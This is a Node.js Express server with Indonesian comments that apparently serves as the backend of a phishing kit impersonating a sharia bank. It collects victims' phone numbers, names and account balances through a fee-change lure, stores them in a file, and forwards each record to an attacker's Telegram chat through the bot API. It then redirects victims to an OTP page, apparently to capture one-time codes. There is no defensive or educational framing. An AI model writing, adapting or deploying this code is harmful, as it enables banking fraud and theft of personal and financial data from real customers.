// Import modul yang diperlukan
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Inisialisasi Express
const app = express();
const PORT = 3000;

// Konfigurasi Telegram
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// 1. Fungsi untuk menyimpan data ke file
function saveData(data) {
    const filePath = path.join(__dirname, 'data', 'submissions.json');
    
    // Pastikan folder data ada
    if (!fs.existsSync('data')) {
        fs.mkdirSync('data');
    }
    
    // Baca data yang sudah ada
    let existingData = [];
    if (fs.existsSync(filePath)) {
        const fileContent = fs.readFileSync(filePath, 'utf8');
        existingData = JSON.parse(fileContent);
    }
    
    // Tambahkan data baru
    existingData.push(data);
    
    // Simpan ke file
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
    console.log('✅ Data disimpan:', data.id);
}

// 2. Fungsi untuk mengirim ke Telegram
async function sendToTelegram(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('⚠️  Token Telegram tidak ditemukan');
        return false;
    }

    try {
        // Format pesan
        const message = `
📱 *DATA BARU BANK SYARIAH* 📱

• No. HP: ${data.nohp}
• Nama: ${data.nama}
• Saldo: Rp ${data.saldo}
• Tarif: ${data.tarif === 'baru' ? 'Baru (Rp 150.000/bulan)' : 'Lama (Rp 6.500/transaksi)'}
• Waktu: ${new Date().toLocaleString('id-ID')}
• ID: ${data.id}
        `.trim();

        // Kirim ke Telegram
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log('✅ Data dikirim ke Telegram');
        return true;
    } catch (error) {
        console.log('❌ Gagal mengirim ke Telegram:', error.message);
        return false;
    }
}

// 3. Endpoint utama untuk menerima data form
app.post('/rest/no.js', async (req, res) => {
    console.log('📥 Menerima data form...');
    
    const { tarif, nohp, nama, saldo } = req.body;
    
    // Validasi data
    if (!tarif || !nohp || !nama || !saldo) {
        return res.json({ success: false, message: 'Data tidak lengkap' });
    }
    
    // Format data
    const formData = {
        id: Date.now().toString(36) + Math.random().toString(36).substr(2),
        tarif,
        nohp: nohp.replace(/\D/g, ''),
        nama: nama.trim(),
        saldo: saldo.replace(/\D/g, ''),
        timestamp: new Date().toISOString()
    };
    
    try {
        // Simpan data
        saveData(formData);
        
        // Kirim ke Telegram
        await sendToTelegram(formData);
        
        // Beri respons ke frontend
        res.json({ 
            success: true, 
            message: 'Data berhasil diproses',
            redirect: '/otp.html'
        });
        
    } catch (error) {
        console.log('❌ Error:', error);
        res.json({ success: false, message: 'Terjadi kesalahan' });
    }
});

// 4. Endpoint untuk halaman utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 5. Endpoint untuk halaman OTP
app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

// 6. Jalankan server
app.listen(PORT, () => {
    console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
});
